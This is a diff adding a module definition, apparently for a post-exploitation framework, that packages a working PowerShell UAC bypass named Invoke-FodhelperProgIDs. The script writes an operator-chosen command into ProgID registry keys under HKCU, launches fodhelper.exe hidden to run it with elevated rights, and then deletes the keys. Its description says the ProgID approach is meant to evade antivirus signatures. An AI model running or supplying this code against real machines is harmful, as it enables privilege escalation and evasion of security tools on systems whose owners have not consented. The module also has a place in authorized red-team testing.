@@ -1,0 +1,52 @@
+name: Invoke-FodhelperProgIDs
+authors:
+  - '@V3ded'
+  - '@netbiosX'
+  - '@m1m1k4tz'
+description: |
+  Bypasses UAC by performing a registry modification for FodHelper but uses ProgIDs to bypass antivirus signatures on the registry key
+software: ''
+techniques:
+  - T1088
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - 'https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses'
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: Command
+    description: Command to execute
+    required: true
+    value: ''
+
+script: |
+  function Invoke-FodhelperProgIDs { 
+      Param (    
+          [String]$Command = ""
+      )
+      
+      # Warning: a ProgID entry needs to be located in the HKCR (HKEY_CLASSES_ROOT) hive in order to take effect.
+      #                                                    HKCR = HKLM:\Software\Classes
+      #                                                         = HKCU:\Software\Classes
+      New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+      Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $Command -Force
+      
+      New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+      Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+      
+      Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    
+      Start-Sleep 3
+    
+      Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+      Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force
+  }
+
+script_end: Invoke-FodhelperProgIDs {{ PARAMS }}
